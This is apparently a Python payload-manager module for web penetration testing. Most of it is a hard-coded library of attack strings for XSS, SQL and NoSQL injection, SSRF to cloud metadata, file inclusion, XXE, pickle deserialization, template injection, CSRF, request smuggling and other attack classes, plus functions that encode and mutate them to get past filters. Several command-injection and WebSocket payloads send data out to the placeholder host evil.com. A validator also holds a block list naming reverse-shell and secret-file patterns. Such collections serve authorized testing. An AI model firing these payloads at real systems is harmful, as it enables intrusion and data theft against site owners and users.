from dataclasses import dataclass
from typing import List, Dict, Optional
import re
import json
import hashlib
from pathlib import Path
import random
import base64
from urllib.parse import quote

@dataclass
class PayloadMetadata:
    """Metadata for individual payloads"""
    description: str
    severity: str  # low, medium, high
    category: str
    tags: List[str]
    author: Optional[str] = None
    references: Optional[List[str]] = None
    cve: Optional[str] = None
    cvss_score: Optional[float] = None

class PayloadGenerator:
    """Generate and mutate payloads"""
    
    @staticmethod
    def generate_random_string(length: int = 10) -> str:
        """Generate random string for testing"""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        return ''.join(random.choice(chars) for _ in range(length))

    @staticmethod
    def mutate_payload(payload: str, mutations: Dict[str, str]) -> str:
        """Mutate payload by applying character substitutions"""
        mutated = payload
        for original, replacement in mutations.items():
            mutated = mutated.replace(original, replacement)
        return mutated
    
    @staticmethod
    def encode_payload(payload: str, encoding: str) -> str:
        """Encode payload using specified encoding"""
        encodings = {
            "url": lambda p: quote(p),
            "html": lambda p: p.replace("<", "&lt;").replace(">", "&gt;"),
            "base64": lambda p: base64.b64encode(p.encode()).decode(),
            "hex": lambda p: ''.join([hex(ord(c))[2:] for c in p]),
            "unicode": lambda p: ''.join([f"\\u00{hex(ord(c))[2:]:0>2}" for c in p])
        }
        return encodings.get(encoding, lambda p: p)(payload)

class PayloadManager:
    """Manage and load payload configurations"""
    
    def __init__(self, payload_dir: str = "configs/payloads"):
        self.payload_dir = Path(payload_dir)
        self.payload_dir.mkdir(parents=True, exist_ok=True)
        self.payloads: Dict[str, Dict] = {}
        self.metadata: Dict[str, PayloadMetadata] = {}
        
        # Common character mutations for bypass attempts
        self.mutations = {
            "<": ["&lt;", "%3C", "\\u003c"],
            ">": ["&gt;", "%3E", "\\u003e"],
            "'": ["&apos;", "&#x27;", "\\u0027"],
            "\"": ["&quot;", "&#x22;", "\\u0022"],
            "(": ["&#40;", "%28", "\\u0028"],
            ")": ["&#41;", "%29", "\\u0029"],
        }
        
        self._initialize_default_payloads()

    def _initialize_default_payloads(self):
        """Initialize default payload configurations"""
        self.payloads = {
            "xss": {
                "basic": [
                    "<script>alert('XSS')</script>",
                    "<img src=x onerror=alert('XSS')>",
                    "javascript:alert('XSS')"
                ],
                "advanced": [
                    "<svg/onload=alert('XSS')>",
                    "<iframe src=\"javascript:alert('XSS')\">",
                    "'-alert('XSS')-'"
                ],
                "dom": [
                    "javascript:eval('alert(1)')",
                    "#<img src=/ onerror=alert(1)>",
                    "javascript:void(alert(1))"
                ],
                "polyglot": [
                    "jaVasCript:/*-/*`/*\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"
                ]
            },
            "sqli": {
                "error_based": [
                    "' OR '1'='1",
                    "' UNION SELECT NULL--",
                    "1' ORDER BY 1--"
                ],
                "blind": [
                    "' AND SLEEP(5)--",
                    "' AND 1=BENCHMARK(100000,MD5(1))--",
                    "' AND IF(1=1,SLEEP(5),0)--"
                ],
                "time_based": [
                    "(SELECT * FROM (SELECT(SLEEP(5)))a)",
                    "'+SLEEP(5)+'",
                    "1' AND SLEEP(5) AND '1'='1"
                ],
                "nosql": [
                    '{"$ne": null}',
                    '{"$gt": ""}',
                    '{"$where": "sleep(5000)"}'
                ]
            },
            "ssrf": {
                "basic": [
                    "http://127.0.0.1",
                    "http://localhost",
                    "file:///etc/passwd"
                ],
                "advanced": [
                    "http://[::1]",
                    "http://127.0.0.1:80",
                    "dict://127.0.0.1:11211/"
                ],
                "cloud": [
                    "http://169.254.169.254/latest/meta-data/",
                    "http://metadata.google.internal/",
                    "http://100.100.100.200/latest/meta-data/"
                ]
            },
            "file_inclusion": {
                "lfi": [
                    "../../../etc/passwd",
                    "....//....//....//etc/passwd",
                    "/etc/passwd%00"
                ],
                "rfi": [
                    "http://evil.com/shell.txt",
                    "https://evil.com/shell.txt%00",
                    "data:text/plain;base64,PHN..."
                ],
                "wrapper": [
                    "php://filter/convert.base64-encode/resource=index.php",
                    "php://input",
                    "zip://shell.jpg%23shell.php"
                ]
            },
            "command_injection": {
                "basic": [
                    "; ls -la",
                    "| cat /etc/passwd",
                    "`` ping -c 1 evil.com ``"
                ],
                "advanced": [
                    "$({sleep,5})",
                    "$(sleep 5)",
                    "`sleep 5`"
                ],
                "blind": [
                    "|curl http://evil.com/`whoami`",
                    "$(ping -c 1 evil.com)",
                    "`wget http://evil.com/?$(id)`"
                ]
            },
            "xxe": {
                "basic": [
                    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
                    '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>',
                    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/passwd">]><data>&file;</data>'
                ],
                "blind": [
                    '<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]>',
                    '<?xml version="1.0"?><!DOCTYPE data [<!ENTITY % payload SYSTEM "http://evil.com/evil.dtd">%payload;]>'
                ]
            },
            "deserialization": {
                "php": [
                    'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
                    'a:2:{i:0;s:4:"test";i:1;s:4:"test";}',
                ],
                "java": [
                    'rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAA==',
                    'AC ED 00 05 73 72 00 11'
                ],
                "python": [
                    "cos\nsystem\n(S'ls -la'\ntR.",
                    "ctypes\nWinDLL\n(S'kernel32'\ntR."
                ]
            },
            "template_injection": {
                "basic": [
                    "{{7*7}}",
                    "${7*7}",
                    "<%= 7 * 7 %>"
                ],
                "advanced": [
                    "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}",
                    "${T(java.lang.Runtime).getRuntime().exec('ls')}",
                    "<%= system('ls') %>"
                ]
            },
            "csrf": {
                "basic": [
                    '<form action="http://target.com/api/user" method="POST"><input type="hidden" name="email" value="attacker@evil.com" /></form>',
                    '<img src="http://target.com/api/account/delete?confirm=true">',
                ],
                "ajax": [
                    """
                    <script>
                    fetch('http://target.com/api/settings', {
                        method: 'POST',
                        credentials: 'include',
                        body: JSON.stringify({email: 'attacker@evil.com'})
                    });
                    </script>
                    """
                ]
            },
            "open_redirect": {
                "basic": [
                    "//evil.com",
                    "https://evil.com",
                    "//evil.com/path?param=value"
                ],
                "advanced": [
                    "javascript://evil.com%0aalert(1)",
                    "data://text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
                    "validate\x2Eredirect\x2Ecom"
                ]
            },
            "http_smuggling": {
                "basic": [
                    "Transfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\nQ",
                    "Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX",
                ],
                "advanced": [
                    "Transfer-Encoding: xchunked\r\n\r\n",
                    "Transfer-Encoding:\x20chunked\r\n\r\n",
                    "Transfer-Encoding: chunk\r\nTransfer-Encoding: chunked\r\n\r\n"
                ]
            },
            "cors_misconfiguration": {
                "basic": [
                    "Origin: https://evil.com",
                    "Origin: null",
                    "Origin: http://localhost"
                ],
                "advanced": [
                    "Origin: https://target.com.evil.com",
                    "Origin: https://evil-target.com",
                    "Origin: http://subdomain.target.com.evil.com"
                ]
            },
            "websocket": {
                "basic": [
                    "<script>WebSocket.prototype.send=function(x){fetch('http://evil.com/?'+x)}</script>",
                    "ws://evil.com:80/socket",
                    "wss://evil.com:443/socket"
                ]
            },
            "graphql": {
                "introspection": [
                    """
                    query IntrospectionQuery {
                        __schema {
                            queryType { name }
                            mutationType { name }
                            subscriptionType { name }
                            types { ...FullType }
                        }
                    }
                    """,
                ],
                "batch": [
                    """
                    query {
                        user(id: 1) {
                            email
                            password
                        }
                    }
                    """
                ]
            },
            "insecure_file_upload": {
                "basic": [
                    "shell.php",
                    "../../etc/passwd",
                    ".htaccess",
                ],
                "bypass": [
                    "shell.php.jpg",
                    "shell.php%00.jpg",
                    "shell.PhP5",
                ]
            },
            "jwt": {
                "none_algorithm": [
                    """
                    {
                        "alg": "none",
                        "typ": "JWT"
                    }
                    """,
                ],
                "weak_secret": [
                    "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.admin",
                ],
            },
            "ldap_injection": {
                "basic": [
                    "*)(uid=*))(|(uid=*",
                    "*()|&'",
                    "*/*",
                ],
                "auth_bypass": [
                    "admin*",
                    "admin)(&)",
                    "*)(uid=*))(|(uid=*",
                ]
            },
            "path_traversal": {
                "basic": [
                    "../../../etc/passwd",
                    "..\\..\\..\\windows\\win.ini",
                    "....//....//....//etc/passwd",
                ],
                "encoded": [
                    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    "..%252f..%252f..%252fetc%252fpasswd",
                    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
                ]
            }
        }

    def get_payloads(self, vuln_type: str, category: str = None, 
                     encode: str = None, mutate: bool = False,
                     limit: int = None) -> List[str]:
        """Get payloads for specific vulnerability type and category"""
        if vuln_type not in self.payloads:
            return []
            
        if category and category in self.payloads[vuln_type]:
            payloads = self.payloads[vuln_type][category]
        else:
            payloads = [p for c in self.payloads[vuln_type].values() for p in c]
            
        result_payloads = []
        for payload in payloads:
            if mutate:
                for mutation_set in self.mutations.values():
                    for mutation in mutation_set:
                        result_payloads.append(
                            PayloadGenerator.mutate_payload(payload, {mutation: mutation})
                        )
            if encode:
                result_payloads.append(
                    PayloadGenerator.encode_payload(payload, encode)
                )
            result_payloads.append(payload)
            
        result_payloads = list(set(result_payloads))  # Remove duplicates
        
        if limit:
            return result_payloads[:limit]
        return result_payloads

    def add_payload(self, vuln_type: str, category: str, payload: str, 
                   metadata: Optional[PayloadMetadata] = None):
        """Add new payload with optional metadata"""
        if not self.validate_payload(payload):
            raise ValueError("Payload failed security validation")
            
        if vuln_type not in self.payloads:
            self.payloads[vuln_type] = {}
        if category not in self.payloads[vuln_type]:
            self.payloads[vuln_type][category] = []
            
        payload_hash = hashlib.md5(payload.encode()).hexdigest()
        
        self.payloads[vuln_type][category].append(payload)
        if metadata:
            self.metadata[payload_hash] = metadata

    def validate_payload(self, payload: str) -> bool:
        """Validate payload for basic safety checks"""
        # Check for obviously dangerous patterns
        dangerous_patterns = [
            r"rm\s+-rf",
            r"chmod\s+777",
            r"mkfifo",
            r"mknod",
            r"nc\s+-e",
            r"bash\s+-i",
            r">\/dev\/null",
            r"\/etc\/shadow",
            r"\/etc\/security",
            r"\/root\/.*",
            r"eval\s*\(",
            r"system\s*\(",
            r"exec\s*\(",
            r"passthru\s*\("
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, payload, re.IGNORECASE):
                return False
        
        return True

    def save_payloads(self, filename: str):
        """Save all payloads to a JSON file"""
        output = {
            "payloads": self.payloads,
            "metadata": {k: vars(v) for k, v in self.metadata.items()}
        }
        
        with open(self.payload_dir / filename, 'w') as f:
            json.dump(output, f, indent=4)

    def load_payloads(self, filename: str):
        """Load payloads from a JSON file"""
        file_path = self.payload_dir / filename
        if not file_path.exists():
            raise FileNotFoundError(f"Payload file not found: {filename}")
            
        with open(file_path) as f:
            data = json.load(f)
            
        self.payloads = data["payloads"]
        self.metadata = {
            k: PayloadMetadata(**v) for k, v in data.get("metadata", {}).items()
        }

    def get_payload_by_hash(self, payload_hash: str) -> Optional[str]:
        """Retrieve a payload using its hash"""
        for vuln_type in self.payloads:
            for category in self.payloads[vuln_type]:
                for payload in self.payloads[vuln_type][category]:
                    if hashlib.md5(payload.encode()).hexdigest() == payload_hash:
                        return payload
        return None

    def get_metadata(self, payload: str) -> Optional[PayloadMetadata]:
        """Get metadata for a specific payload"""
        payload_hash = hashlib.md5(payload.encode()).hexdigest()
        return self.metadata.get(payload_hash)

    def export_payloads(self, vuln_type: str = None, format: str = "json") -> str:
        """Export payloads to various formats"""
        if format == "json":
            if vuln_type:
                return json.dumps(self.payloads.get(vuln_type, {}), indent=4)
            return json.dumps(self.payloads, indent=4)
        elif format == "txt":
            result = []
            payloads_dict = self.payloads.get(vuln_type, {}) if vuln_type else self.payloads
            for vtype, categories in payloads_dict.items():
                for category, payloads in categories.items():
                    for payload in payloads:
                        result.append(f"{vtype}\t{category}\t{payload}")
            return "\n".join(result)
        else:
            raise ValueError(f"Unsupported export format: {format}")

    def get_statistics(self) -> Dict[str, Dict[str, int]]:
        """Get statistics about loaded payloads"""
        stats = {}
        for vuln_type in self.payloads:
            stats[vuln_type] = {
                "total_payloads": sum(len(payloads) for payloads in self.payloads[vuln_type].values()),
                "categories": len(self.payloads[vuln_type]),
                "unique_payloads": len(set(
                    payload for category in self.payloads[vuln_type].values() 
                    for payload in category
                ))
            }
        return stats

    def clean_payloads(self, vuln_type: str = None):
        """Remove duplicate payloads"""
        if vuln_type:
            vuln_types = [vuln_type]
        else:
            vuln_types = list(self.payloads.keys())
            
        for vtype in vuln_types:
            if vtype in self.payloads:
                for category in self.payloads[vtype]:
                    self.payloads[vtype][category] = list(set(self.payloads[vtype][category]))

    def merge_payloads(self, other_manager: 'PayloadManager'):
        """Merge payloads from another PayloadManager instance"""
        for vuln_type, categories in other_manager.payloads.items():
            if vuln_type not in self.payloads:
                self.payloads[vuln_type] = {}
            
            for category, payloads in categories.items():
                if category not in self.payloads[vuln_type]:
                    self.payloads[vuln_type][category] = []
                
                self.payloads[vuln_type][category].extend(payloads)
                
        # Merge metadata
        self.metadata.update(other_manager.metadata)
        
        # Remove duplicates
        self.clean_payloads()

# Example usage
if __name__ == "__main__":
    # Initialize payload manager
    manager = PayloadManager()
    
    # Get XSS payloads with encoding
    xss_payloads = manager.get_payloads("xss", "basic", encode="html")
    print("\nXSS Payloads (HTML Encoded):", xss_payloads[:3])
    
    # Get SQL injection payloads with mutations
    sqli_payloads = manager.get_payloads("sqli", "error_based", mutate=True)
    print("\nSQLi Payloads (Mutated):", sqli_payloads[:3])
    
    # Add custom payload with metadata
    metadata = PayloadMetadata(
        description="Custom XSS payload using SVG",
        severity="medium",
        category="xss",
        tags=["custom", "bypass", "svg"],
        author="Security Researcher",
        references=["https://owasp.org/www-community/attacks/xss/"],
        cve="CVE-2021-XXXX",
        cvss_score=6.5
    )
    
    manager.add_payload(
        "xss",
        "custom",
        "<svg><animate onbegin=alert('XSS')>",
        metadata
    )
    
    # Get statistics
    stats = manager.get_statistics()
    print("\nPayload Statistics:", json.dumps(stats, indent=2))
    
    # Export specific vulnerability type payloads
    xss_export = manager.export_payloads("xss", format="txt")
    print("\nXSS Payloads Export Sample:", xss_export.split("\n")[:3])
    
    # Save and load payloads
    manager.save_payloads("custom_payloads.json")
    new_manager = PayloadManager()
    new_manager.load_payloads("custom_payloads.json")